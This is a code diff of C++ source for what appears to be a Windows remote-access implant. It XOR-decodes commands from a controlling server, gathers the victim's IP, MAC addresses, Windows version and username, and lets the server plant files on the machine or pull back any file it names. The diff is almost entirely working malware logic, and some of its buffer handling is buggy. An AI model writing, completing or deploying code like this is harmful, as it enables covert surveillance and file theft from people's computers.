@@ -47,7 +47,10 @@ using namespace std;
 // used to encrypt/decrypt data
 char* xor_func(char msg[]) {
 	for (int i = 0; i < strlen(msg); i++) {
-		msg[i] ^= '+'; // XOR each character with '+'
+		if (msg[i] != '\0' && msg[i] != '+') {
+			msg[i] ^= '+'; // XOR each character with '+'
+		}
+		
 	}
 	return msg; // return XORd character array
 }
@@ -272,7 +275,7 @@ std::string getSysInfo() {
 	return  "PUBLIC IP:\n" + getPublicIP() + "\n\n" +
 		"MAC Addresses:\n" + getMACs() + "\n\n" +
 		"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
-		"USERNAME:\n" + getUsername();
+		"USERNAME:\n" + getUsername() + "\n";
 }
 /*
 std::string wcharToStdString(const WCHAR* w_str){
@@ -545,11 +548,11 @@ void sendMsg(std::string data, SOCKET sock) {
 		printf("sending %d bytes\n", numToCopy);  // show how many bytes are sent in this datablock
 		send(sock, tempBuf, numToCopy, 0); // send the message (message length <= 1024 bytes)
 	}
-	//delete[] tempBuf;
 }
 
 int main() {
 	int cmd;						// var for command from server
+	std::string resMsg;
 	int command_packet_len;			// var for length of command packet
 	char buf[DEFAULT_BUFLEN];		// var for character buffer to send data to the server
 	char recvbuf[DEFAULT_BUFLEN];	// var for character buffer to rcv data to the server
@@ -565,13 +568,6 @@ int main() {
 		memset(buf, 0, DEFAULT_BUFLEN);		// clear buffer
 		memset(recvbuf, 0, DEFAULT_BUFLEN); // clear rcv buffer
 		recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
-		/*
-		recv(sock, (char *)&command_packet_len, 4, 0);
-
-		char* filepath = (char*)malloc(command_packet_len);
-
-		ZeroMemory(filepath, command_packet_len);
-		*/
 
 		printf("enc: %s ", recvbuf); // debug
 		int cmd = parseCmd(xor_func(recvbuf)); // call parseCmd() function to parse the received command after applying xor_func() to it
@@ -587,69 +583,78 @@ int main() {
 		} break;
 
 		case 0: {
-			printf("From upload buffer: %s\n", buf);  //debug
-			const char* filename = "received_file.txt";
-			char buf[DEFAULT_BUFLEN] = { 0 };
-			ofstream file(filename, ios::binary);
-			if (!file) {
-				printf("Failed to create file %s", filename); // debug
-				return 2;
-			}
+			printf("Upload\n"); // debug
+			// get filename from server
+			std::string resMsg;
+			memset(recvbuf, 0, DEFAULT_BUFLEN);
+			recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
+			char* filename = xor_func(recvbuf);
+			printf("filename: %s\n", filename); // debug
+			std::string filenameStr(filename, strlen(filename));
 
-			int bytesRecvd = 0;
-			while ((bytesRecvd = recv(sock, buf, DEFAULT_BUFLEN, 0)) > 0) {
-				file.write(xor_func(buf), bytesRecvd);
-			}
+			resMsg = filenameStr + " received.";
+			sendMsg(resMsg, sock);
 
-			if (bytesRecvd < 0) {
-				printf("File receive error"); // debug
-				return 1;
-			}
+			// get length of data to come
+			memset(recvbuf, 0, DEFAULT_BUFLEN);
+			int br = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
+			char* lenCStr = xor_func(recvbuf);
+			printf("lenStr: %s\n", lenCStr); // debug
+			std::string lenStr(lenCStr, strlen(lenCStr));
 
-			printf("File %s Received successfully", filename); // debug
+			std::istringstream iss(lenStr);
+			printf("before hex");
+			unsigned int dataLen = 0;
+			iss >> std::hex >> dataLen; // length of data to come
+			cout << "(dataLen) msg length(hex): " << dataLen << "\n"; // debug
+
+			// test which data len works
+			unsigned int receivedLen = std::strtoul(xor_func(recvbuf), NULL, 16);
+			printf("receivedLen msg length(hex): %d\n", receivedLen); // debug
+			size_t msgLen = static_cast<size_t>(receivedLen);
+			
+			// handle the upload from server
+			std::vector<char> databuf(DEFAULT_BUFLEN);
+			
+			std::ofstream file(filenameStr, std::ios::out | std::ios::binary); //Open the file
+			if (!file.is_open()) {
+				// download error handling
+				resMsg = "1";
+				sendMsg(resMsg, sock); 
+			}
+			while (dataLen > 0) {
+				int bytesToReceive = std::min(static_cast<int>(dataLen), DEFAULT_BUFLEN);
+				int bytesReceived = recv(sock, databuf.data(), bytesToReceive, 0);
+				file.write(xor_func(databuf.data()), bytesReceived);
+				dataLen -= bytesReceived;
+			}
 			file.close();
-			return 0;
-			int confirm = 0; //handle_upload(sock, filename); // receive the file
-			if (confirm == 0) {
-				sprintf(buf, "Client Received File\n");
-			}
-			else if (confirm == 2) {
-				sprintf(buf, "Client Failed to create file\n");
-			}
-			else {
-				sprintf(buf, "File receive error\n");
-			}
-			// tell server client recieved the file (or not)
-			xor_func(buf);
-			send(sock, buf, strlen(buf), 0);
+			resMsg = "File recived successfully";
+			sendMsg(resMsg, sock);
 		} break;
 
 		case 1: {
 			printf("Download\n"); // debug
-			// get filepath from server
+			// get filename from server
 			memset(recvbuf, 0, DEFAULT_BUFLEN);
 			recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
-			char* filepath; // var for filepath
+			char* filename; // init var for filename
 			
-			filepath = xor_func(recvbuf);
-			printf("filepath: %s\n", filepath);
+			filename = xor_func(recvbuf); // decode xor_func
+			printf("filename: %s\n", filename); // debug
 
 			// handle the download
-			std::string filepathStr(filepath, strlen(filepath));
-			std::ifstream file(filepathStr, std::ios::binary); //Open the file
+			std::string filenameStr(filename, strlen(filename));
+			std::ifstream file(filenameStr, std::ios::binary); //Open the file
 			if (!file.is_open()) {
 				// download error handling
-				std::string errMsg = "1";
-				sendMsg(errMsg, sock);
+				resMsg = "1";
+				sendMsg(resMsg, sock);
 			}
 
 			std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
 
 			sendMsg(fileContents, sock);
-
-			// handle_download(sock, filepath.c_str()); 
-			// read command_packet_length bytes into filename
-			// open filename, send chunks back out socket
 		} break;
 
 		//new case for getRunningProcess;
